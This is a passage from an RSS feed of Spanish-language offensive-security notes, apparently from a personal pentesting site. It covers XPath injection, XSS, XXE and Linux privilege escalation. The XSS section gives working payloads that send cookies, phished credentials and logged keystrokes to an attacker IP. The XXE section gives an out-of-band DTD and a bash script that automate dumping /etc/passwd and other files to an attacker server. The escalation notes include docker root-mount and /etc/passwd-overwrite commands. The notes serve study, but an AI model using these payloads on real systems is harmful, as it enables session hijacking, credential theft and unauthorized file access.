	    &lt;name&gt;mark&lt;/name&gt;
	    &lt;password&gt;m12345&lt;/password&gt;
	    &lt;account&gt;regular&lt;/account&gt;
	&lt;/user&gt;
	&lt;user&gt;
	    &lt;name&gt;fino&lt;/name&gt;
	    &lt;password&gt;fino2&lt;/password&gt;
		&lt;account&gt;regular&lt;/account&gt;
	&lt;/user&gt;
&lt;/data&gt;
Copy<br>Tendríamos una etiqueta primaría la cual sería DATA.  Por lo que para verificar esto, existe la query: <br>1' and count(/*)='1<br>De esta manera, le indicamos que si la suma de todas las etiquetas raizes (PRIMARIAS), es igual a 1, la query se convierta a TRUE. Pudiendo así, verificar que las etiquetas primarias son (en este caso) 1. <br>Una vez sabiendo la cantidad de etiquetas primarias, tocaria comenzar a descifrar el valor de esta misma. <br>Con la query 1' and name(/*[1])='data estariamos indicando que el valor de la primera etiqueta es data, de manera que donde pone [ 1 ] prodríamos cambiarlo por otros valores en caso de existir otra etiqueta, ahora bien, esto sirve para saber el nombre COMPLETO, pero si quisieramos dumpear este valor que de primer no conocemos, deberiamos hacer de una menera similar a las <a data-href="SQLI - (SQL Injections)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/sqli-(sql-injections).html" class="internal-link" target="_self" rel="noopener nofollow">SQLI - (SQL Injections)</a>, jugando con substring 1' and substring(name(/*[1]),1,1)='a para que al igual que en las SQLI, podemos mediante fuerza bruta, extraer los valores correctos. <br>Tambien podríamos extraer la longitud de la etiqueta en cuestion con la query 1' and string-length(name(/*[1]))&gt;'2 .<br>Una vez que tengamos las etiquetas principales, podriamos verificar la cantidad de etiquetas dentro de cada una de estas etiquetas primarias (En este caso hay 1), con la query 1' and count(/*[1]/*)='1. <br>Y el mismo proceso, prodríamos ver el valor con 1' and name(/*[1]/*[1])='user o con 1' and substring(name(/*[1]/*[1]),1,1)='u.<br>Y de esta manera se vuelve constante, tanto para saber el la cantidad de etiquetas hijas que tiene una etiqueta padre, con count, como la longitud de una determinada etiqueta con string-length, como el nombre de una etiqueta con name o el primer, segundo, tercer, etc caracter con substring. Y para variar los niveles de las etiquetas /*[1]/*[1]/*[1], en este caso estariamos referenciando a la etiqueta &lt;name&gt;. <br>Por ultimo, para que en base a determinada etiqueta podamos obtener los valores, usariamos la query 1' and substring(name,1,1)='n, el primer 1 nos hace que las cosas sean un poco más faciles ya que apunta al primer producto. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/xpath-injections.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/XPath Injections.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:49:16 GMT</pubDate></item><item><title><![CDATA[¿ Que es?]]></title><description><![CDATA[ 
 <br><br>Es un tipo de vulnerabilidad de seguridad informática que permite a un atacante ejecutar código malicioso en la página web de un usuario sin su conocentimiento. Esta vulnerabilidad permite al atacanta robar información personal, como nombres de usuario, contraseñas y otros datos confidenciales.<br><br><br>
<br>

Este tipo de XSS se produce cuando los datos proporcionados por le usuario se reflejan en la respuesta HTTP sin ser verificados adecuadamente. Esto permite a un atacante inyectar código malicioso en la respuesta, que luego se ejecuta en el navegador del usuario. 

<br>

Este tipo de XSS se produce cuando un atacante es capaz de almacenar código malicioso en una base de datos o en el servidor web que aloja una página web vulnerable. Este código se ejecuta cada ve que se carga la página. 

<br>

Estipo tipo de XSS se produce cuando el código malicioso se ejecuta en el navegador del usuario a través del DOM (Document Object Model). Esto se produce cuando el código JavaScript en una página web modifica el DOM en una forma que es vulnerable a la inyección de código malicioso.

<br><br>
<br>


<br>Los fines de esta vulnerabilidad se basan tanto en el contexto, como en el atacante y sus fines. Pero se podrian realizar multiples ataques.<br>
<br>


<br>El fin de esto claramente es realizar un cookie hijacking para secuestrar la sesión del usuario que visite la sección vulnerable a XSS de la página.<br>
<br>


<br><br>Bug
&lt;script src='http://{nuestra_ip}/get_cookie.js'&gt;&lt;/script&gt;
Copy
<br><br>Bug
var request = new XMLHttpRequest();
request.open('GET', `http://192.168.1.38/?cookie=${document.cookie}`);
request.send();
Copy
<br><br>Bug
&lt;script&gt;document.location="http://{our_ip}/?cookie="+document.cookie&lt;/script&gt;
Copy
<br>Hablamos de un INTENTO de robo de sesión ya que si la cookie tiene la opción httpOnly checkeada, seria imposible. <br>
<br>


<br>En este ejemplo, interceptamos con <a data-href="Burpsuite" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/burpsuite.html" class="internal-link" target="_self" rel="noopener nofollow">Burpsuite</a> la petición en la sección vulnerable a XSS la cual estaba en una página al hacer una publicación, por lo que se realizaba un POST a la ulr tramitando la data ingresada por el usuario a la par que un campo extra el cual se alojaba en la respuesta del servidor por lo que en caso de que fuese dinamico, lo primero que hacemos es capturar este para posteriormente realizar un post como el usuario.<br>
<br>


<br><br>Bug
&lt;script src='http://{nuestra_ip}/make_post.js'&gt;&lt;/script&gt;
Copy
<br><br>Bug
const domain = "http://localhost:10007/newgossip";
const req1 = new XMLHttpRequest(); 
req1.open('GET', domain, false);
req1.withCredentials = true;
req1.send(); 

let response = req1.responseText; 
let parser = new DOMParser();
let doc = parser.parseFromString(response, 'text/html')
let token = doc.getElementsByName('_csrf_token')[0].value; 

const data = `title=ME+GUSTA+LA+CIBERSEGURIDAD&amp;subtitle=Este+laburo+es+una+mierda&amp;text=Estoy+re+caliente&amp;_csrf_token=${token}`

const req2 = new XMLHttpRequest(); 
req2.open('POST', `http://localhost:10007/newgossip`, false)
req2.withCredentials = true;
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')
req2.send(data);
Copy
<br>
<br>


<br>El fin de esto es redirigir al usuario, no hace falta que sea a una página de phishing, podria ser cualquier recurso, por lo que en el campo vulnerable se deberia introducir: <br>Bug
&lt;script&gt; window.location.href = 'url'&lt;/script&gt;
Copy
<br>
<br>


<br>En la sección vulnerable  podriamos ingresar un codigo malicioso jugando con JavaScript para intentar crear un formulario de inicio de sesión el cual nos mande las credenciales ingresadas por el usuario a un recurso nuestro.<br>&lt;div id="formContainer"&gt;&lt;/div&gt;

&lt;script&gt; 
	var email;
	var password;
	var form = '&lt;form&gt;' + 'Email: &lt;input type="email" id="email" required&gt;' + '&lt;br&gt;&lt;br&gt;' + 'Contraseña: &lt;input type="password" id="password" required&gt;' + '&lt;br&gt;&lt;br&gt;' + '&lt;input type="button" onclick="submitForm()" value="Ingresar"' + '&lt;/form&gt;';
	
	document.getElementById("formContainer").innerHTML = form;
  
	function submitForm(){
		email = document.getElementById("email").value;
		password = document.getElementById("password").value;
	    console.log("Funciona", email, password)
		fetch(`http://192.168.1.38/?email=${email}&amp;password=${password}`);
	}
&lt;/script&gt;
Copy<br>
<br>


<br>&lt;script&gt;
	let keys = ""; 

	document.onkeypress = function(e){
		e = e || window.event; 
		keys += e.key;
		keys = keys.replace(" ", ","); 
		var i = new Image(); 
		i.src = `http://192.168.1.38/${keys}`; 
	};
&lt;/script&gt;
Copy<br>Con este script capturariamos las pulsaciones del usuario, y las mandariamos a una ip en particualar, donde podriamos tenerun servidor de python y filtrando por esta data que nos llega python -m http.server 80 2&gt;&amp;1 | grep -oP 'GET /\K[^.*\s]+'. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/xss-(-cross-site-scripting-).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/XSS  - ( Cross-Site Scripting ).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:49:24 GMT</pubDate></item><item><title><![CDATA[¿ Que es XML?]]></title><description><![CDATA[ 
 <br><br>XML es un metalenguaje que permite definir lenguajes de marcas desarrollado por el World Wide Web Consortium utilizado para almacenar datos en forma legible.<br>XML (EXtensible Markup Langague) se encarga de almacenar y transportar datos siguiendo una estructura de arbol.<br>
<img alt="xml.png" src="https://dobliuw.com/lib/media/xml.png"><br><br><br>Las entidades son una forma de representar a un elemento de datos , sin referenciar a los datos, esto en un documento XML.<br>Existen entidades Genericas / Customizadas, Externas (XXE), Predefinidas (&lt;, &gt;)]. <br><br><br>Un XML External Entitiy Injection o XXE, a lo que nos referimos es a una vulnerabilidad de seguridad en la que un atacante puede utilizar una entrada XML maliciosa para acceder a revursos del sistema que normalmente no estarían disponibles, como archivos locales o servicios de red. Esta vulnerabilidad puede ser explotada en aplicaciones que utilizan XML para procesar entradas, como apliacciones web o servicios web. <br>Un ataque XXE mayormente implica la inyección en una entidad XML maliciosa en una solicitud HTTP, que es procesada por el servodpr y puede resultar en la xposición de información sensible. Como en la mayoria de vulnerabilidades, esta vulnerabilidad se da cuando el servidor web no valida adecuadamente la entrada de datos XML que recibe.<br>Con XXE no siempre se obtiene una exposición directa de información sensible en la respuesta, si no que aveces el atacante al igual qeu con las <a data-href="SQLI - (SQL Injections)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/sqli-(sql-injections).html" class="internal-link" target="_self" rel="noopener nofollow">SQLI - (SQL Injections)</a> el atacante debe ir a "ciegas" a través de tecnicas adicionales. Esto puede ser más lento y requiere más trabajo que una explotación directa. sin embargo, puede ser efectivo en casos donde el atacante tiene una idea geenral de los recursos disponibles en el sistema y desea obtener información específica sin ser detectado. <br>A si tambien, muchas veces el XXE puede ser utilizado como un vector de ataque para explotar una vulnerabilidad <a data-href="SSRF - (Server-Side Request Forgery)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/ssrf/ssrf-(server-side-request-forgery).html" class="internal-link" target="_self" rel="noopener nofollow">SSRF - (Server-Side Request Forgery)</a> para escanear puertos internos.<br><br><br>Por ejemplo, si tuvieramos la sig petición en XML: <br>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;root&gt;
	&lt;name&gt;dobliuw&lt;/name&gt;
	&lt;tel&gt;11142131241&lt;/tel&gt;
	&lt;email&gt;dobliuw@dobliuw.com&lt;/email&gt;
	&lt;password&gt;dobliuw123&lt;/password&gt;
&lt;/root&gt;
Copy<br>Jugando con un DTD (Document Type Definition) y entidades Externas podemos explotar la vulnerabilidad<br>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY name "dobliuw" &gt;]&gt;
&lt;root&gt;
	&lt;name&gt;dobliuw&lt;/name&gt;
	&lt;tel&gt;11142131241&lt;/tel&gt;
	&lt;email&gt;&amp;name;&lt;/email&gt;
	&lt;password&gt;dobliuw123&lt;/password&gt;
&lt;/root&gt;
Copy<br>En este caso vemos que somos capaces de crear una entidad con &lt;!DOCTYPE foo [&lt;!ENTITY name "dobliuw" &gt;]&gt; y  hacer que el valor de tome en donde va el email con &amp;name, en este caso es name por que la entidad definida se llama name<br>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY myFile SYSTEM "file:///etc/passwd" &gt;]&gt;
&lt;root&gt;
	&lt;name&gt;dobliuw&lt;/name&gt;
	&lt;tel&gt;11142131241&lt;/tel&gt;
	&lt;email&gt;&amp;myFile;&lt;/email&gt;
	&lt;password&gt;dobliuw123&lt;/password&gt;
&lt;/root&gt;
Copy<br>Ahora, esto de llamar la entidad dentro de la estructura xml puede ser que no funcione, por lo que existe el concepto de XEE OOB Blind (XML External Entity Out of Band a ciegas) por lo que para explotarla podriamos ver si se logra hacer una petción http a nuestra maquina.<br>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY % myFile SYSTEM "http://192.168.1.38" &gt; %myFile; ]&gt;
&lt;root&gt;
	&lt;name&gt;dobliuw&lt;/name&gt;
	&lt;tel&gt;12314124&lt;/tel&gt;
	&lt;email&gt;dobliuw@dobliuw.com&lt;/email&gt;
	&lt;password&gt;dobliuw123&lt;/password&gt;
&lt;/root&gt;
Copy<br>En ese caso, podriamos intentar llamar a un archivo en concreto, por ejemplo un "malicious.dtd" con una estructura de entidades para dumpear archivos del sistema de la maquina, recibiendo los archivos como petición http con su cadena en base64. <br>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY % myFile SYSTEM "http://192.168.1.38/malicious.dtd" &gt; %myFile; ]&gt;
&lt;root&gt;
	&lt;name&gt;dobliuw&lt;/name&gt;
	&lt;tel&gt;12314124&lt;/tel&gt;
	&lt;email&gt;dobliuw@dobliuw.com&lt;/email&gt;
	&lt;password&gt;dobliuw123&lt;/password&gt;
&lt;/root&gt;
Copy<br><br>&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://192.168.1.38/?file=%file;'&gt;"&gt;
%eval;
%exfil; 
Copy<br>Y obviamente, explotando nuestras habilidades de atacante, más que claro esta que podriamos crearnos un script en python, bash o cualquier lenguaje para automatizar esto al punto de simplemente escribir un archivo a dumpear y que se dumpee. Asi como tambien es importante tener en cuenta que podriamos realizar un <a data-href="SSRF - (Server-Side Request Forgery)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/ssrf/ssrf-(server-side-request-forgery).html" class="internal-link" target="_self" rel="noopener nofollow">SSRF - (Server-Side Request Forgery)</a> con las XXE. <br>#!/bin/bash 

function ctrl_c(){
	echo -e "\n\n\t[!] Quiting...\n\n"
	kill -9 $PID 
	wait $PID 2&gt;/dev/null 
	/usr/bin/rm -f response
	/usr/bin/rm -f malicious.dtd 
	exit 1 
}

trap ctrl_c SIGINT

if [ $EUID -ne 0 ]; then 
	echo -e "\n\n\t[!] The scrip need runs like root :)\n\n"
else 
  python3 -m http.server 80 &amp;&gt;response &amp;   # Levantamos en segundo plano un servidor http
  PID=$! # Guardamos en la variable PID el PID del proceso para al realizar ctrl c matarlo
  sleep 2 

  while true; do  
  
  echo -ne "\n[!] Introduce el archivo a leer: " &amp;&amp; read -r file; # -r para que acepte espacios 
  
  evildtd="""
  &lt;!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$file\"&gt;
  &lt;!ENTITY % eval \"&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://192.168.1.38/?file=%file;'&gt;\"&gt;
  %eval;
  %exfil;""" # Estructura maliciosa para lograr el dumpeo de archivos 

  [[ -f "malicious.dtd" ]] &amp;&amp; /usr/bin/rm malicious.dtd 
  echo "" &gt; malicious.dtd
  echo $evildtd &gt; malicious.dtd 


  # Automatizamos tambien la petición maliciosa
  /usr/bin/curl -s -X GET "http://localhost:5000/process.php" -d '&lt;?xml version="1.0" encoding="UTF-8"?&gt;
  &lt;!DOCTYPE foo [&lt;!ENTITY % myFile SYSTEM "http://192.168.1.38/malicious.dtd" &gt; %myFile; ]&gt;
  &lt;root&gt;&lt;name&gt;dobliuw&lt;/name&gt;&lt;tel&gt;12314124&lt;/tel&gt;&lt;email&gt;dobliuw@dobliuw.com&lt;/email&gt;&lt;password&gt;dobliuw123&lt;/password&gt;&lt;/root&gt;' &amp;&gt;/dev/null 

  echo -e "\n[+] $file : " &amp;&amp; /usr/bin/cat response | /usr/bin/tail -n 1 | /usr/bin/grep -oP "/?file=\K[^.*]+" | /usr/bin/base64 -d
  done 
fi 
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/xxe-(xml-external-entity-injection-).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/XXE - (XML External Entity Injection ).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:49:30 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/xml.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/xml.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Abusando de privilegios SUID]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a>
<br><br><br>Un privilegio SUID (Set User ID) es un permiso especial que se puede establecer en un archivo binario en sistemas Unix/Linux. Este permiso le da al usuario que ejecuta el archivo los mismos privilegios que el propietario del archivo. <br>Por ejemplo, si un archivo binario tiene establecido el permiso SUID y es propiedad del usuario root, cualquier usuario que lo ejecute adquirirá temporalmente los mismos privilegios que ele usuario root, lo que le permitirá realizar acciones que normalmente no podría hacer como un usuario normal. <br>El abuso de privilegios SUID es una técnica utilizada por los atacantes para elevar su nivel de acceso en un sistema comprometido. Si un atacante es capaz de obtener acceso a un archivo binario con permisos SUID, puede ejecutar comandos con privilegios especiales y realizar acciones maliciosas en el sistema.<br><br>Para prevenir el abuso de privilegios SUID, se recomienda limitar el número de archivos con permisos SUID y asegurarse de que solo se otorguen a archivos que requieran este permiso para funcionar correctamente. Además, es importante monitorear regularmente el sistema para detectar cambios inesperados en los permisos de los archivos y para buscar posibles brechas de seguridad.<br><br>Una vez más la escalada varía en base a como se abuso de los privilegios SUID según el binario que sea, y en este caso también podemos usar páginas como <a data-tooltip-position="top" aria-label="https://gtfobins.github.io/gtfobins" rel="noopener nofollow" class="external-link" href="https://gtfobins.github.io/gtfobins" target="_blank">gtfobins</a>]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/abusando-de-privilegios-suid.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/Abusando de privilegios SUID.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 22 Dec 2023 23:24:19 GMT</pubDate></item><item><title><![CDATA[Abuso de binarios específicos]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> 
<br><br><br>Muchas veces en los sistemas comprometidos se alojan binarios vulnerables por diversas causas a una escalada de privilegios. Sean binarios vulnerables conocidos con su respectivo CVE, o <a data-href="Buffer Overflow" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/4.-advanced/buffer-overflow/buffer-overflow.html" class="internal-link" target="_self" rel="noopener nofollow">Buffer Overflow</a>], entre otras. El abuso de binarios específicos sean legítimos o personalizados, pueden ser explotados para obtener privilegios elevados, lo que destaca la importancia de una adecuada configuración y protección en los sistemas. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/abuso-de-binarios-específicos.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/Abuso de binarios específicos.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:01 GMT</pubDate></item><item><title><![CDATA[Abuso de grupos de usuario especiales]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> 
<br><br><br>En el contexto de Linux, los grupos se utilizan para organizar a los usuarios y asignar permisos para acceder a los recursos del sistema. Los usuarios pueden pertenecer a uno o varios grupos, y los grupos pueden tener diferentes niveles de permisos para acceder a los recursos del sistema. <br>Existen grupos especiales en Linux, como lxd o docker, que se utilizan para permitir a los usuarios ejecutar contenedores de manera segura y eficiente. Sin embargo, si un usuario malintencionado tiene acceso a uno de estos grupos, podría aprovecharlo para obtener privilegios elevados en el sistema.<br>Por ejemplo, si un usuario tiene acceso al grupo docker, podría utilizar la herramienta docker para desplegar nuevos contenedores en el sistema. Durante el proceso de despliegue, el usuario podría aprovecharse de las monturas para hacer que ciertos recursos inaccesibles en la máquina host estén disponibles en el contenedor. Al ganar acceso al contenedor como usuario root, el usuario malintencionado podría inferir o manipular el contenido de estos recursos desde el contenedor. <br><br>El riesgo de que un usuario contenga grupos determinados, como podría ser docker, adm, lxd, entre otros, deriva a raíz de los permisos que estos grupos arrastran con sigo, por ejemplo, en el caso de docker como mencionamos anteriormente se podría aprovechar de sus permisos ciertamente privilegiados para en base a una imagen desplegar un contenedor en el cual haciendo uso de monturas, montar la raíz del sistema en el contenedor para una vez dentro poder acceder a cualquier recurso (docker run -dit --name pwn -v /:/mnt/root ubuntu).<br>En el caso del grupo adm conlleva un riesgo dado que es un grupo el cual suele tener permisos para la lectura de logs del sistema, por lo que si buscáramos los logs a los cuales tiene acceso (find /var/log -group adm 2&gt;/dev/null) veríamos ciertos logs a los cuales tendríamos permisos de lectura pudiendo así llegar a información sensible en algunos casos. <br>En caso del grupo lxd en un caso muy similar a docker, podemos hacer uso de scripts automatizados encontrados con searchsploit o google para explotar la vulnerabilidad de montar toda la raíz del sistema en una ruta específica del contenedor.<br>Para agregar un usuario a un grupo específico podemos hacer uso del comando usermod -a -G {group} {user} y para eliminar a un usuario de un grupo los comandos usermod -d -G {group} {user}  o gpasswd -d {user} {group}. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/abuso-de-grupos-de-usuario-especiales.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/Abuso de grupos de usuario especiales.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 22 Dec 2023 23:24:24 GMT</pubDate></item><item><title><![CDATA[Abuso de permisos incorrectamente implementados]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a>
<br><br><br>En sistemas Linux, los archivos y directorios tiene permisos que se utilizan para controlar el acceso a ellos. Los permisos se dividen en tres categorías: propietario, grupo y otros. Cada categoría puede tener permisos de lectura, escritura y ejecución. Los permisos de un archivo puede ser modificados por el propietario o por el superusuario del sistema. <br>El abuso de permisos incorrectamente implementados ocurre cuando los permisos de un archivo crítico son configurados incorrectamente, permitiendo a un usuario no autorizado acceder o modificar el archivo. Esto puede permitir a un atacante leer información confidencial, modificar archivos importantes, ejecutar comandos maliciosos o incluso obtener acceso de superusuario al sistema. <br>De esta forma, una atacante experimentado podría aprovecharse de esta falla para elevar sus privilegios en el mejor de los casos. Una de las herramientas encargadas de aplicar este reconocimiento en el sistema es 'lse', Linux Smart Enumeration ( LSE ) es una herramienta de enumeración de seguridad para sistemas operativos basados en Linux, diseñada para ayudar a los administradores de sistemas y auditores de seguridad a identificar y evaluar vulnerabilidades y debilidades en la configuración del sistema. <br><a data-tooltip-position="top" aria-label="https://github.com/diego-treitos/linux-smart-enumeration" rel="noopener nofollow" class="external-link" href="https://github.com/diego-treitos/linux-smart-enumeration" target="_blank">LSE</a> está diseñado para ser fácil de usar y proporciona una salida clara y legible para facilitar la identificación de problemas de seguridad. La herramienta utiliza comandos de Linux estándar y se ejecuta en la línea de comandos, lo que significa que no se requiere software adicional. Además, enumera una amplia gama de información del sistema, incluyendo usuarios, grupos, servicios, puertos abiertos, tareas programadas, permisos de archivos, variables de entorno y configuraciones del firewall, entre otros. <br><br>Una vez más puede haber infinitos escenarios, pero esto se basa en errores de asignación de permisos a binarios, archivos, etc. que no debería tener dichos archivos. <br>Por ejemplo, supongamos que una vez vulnerado un sistema con <a data-href="Tools" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/tools.html" class="internal-link" target="_self" rel="noopener nofollow">Tools</a> mencionadas anteriormente como Linux Smart Enumeration o LinPEAS o incluso de manera manual buscando por archivos writables desde la raíz find / -writable 2&gt;/dev/null, encontramos permisos que no deberían estar asignados al /etc/passwd donde otros pueden escribir el mismo (-rw-r--rw-), automáticamente podríamos abusar de permisos incorrectamente implementados, generando con el comando "openssl passwd" al ingresar una password un HASH de la contraseña ingresada para remplazarlo en la línea de /etc/passwd de la contraseña del user root.<br>Remplazando la x de la línea root:x:root:/root:/bin/bash por el hash obtenido de la nueva contraseña root:$1$QDfHsDA6$LkYF/GBe54R4T5FADhgQR0:0:0:root:/root:/bin/bash<br>Otro ejemplo podría ser un archivo que se ejecuta por una tarea cron en nuestro directorio personal, creado por root el cual no podemos editar, pero al estar incorrectamente implementados los permisos, ya que se encuentra en nuestro directorio personal y si bien no podemos editar el mismo, al poder manipular todo contenido dentro de nuestro directorio personal, podríamos eliminarlo para volver a crear otro archivo con el mismo nombre pero malicioso. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/abuso-de-permisos-incorrectamente-implementados.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/Abuso de permisos incorrectamente implementados.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 10 Jun 2024 13:13:05 GMT</pubDate></item><item><title><![CDATA[Abuso de privilegios a nivel de Sudoers]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:ataques" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#ataques</a> <a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> 
 <br><br>
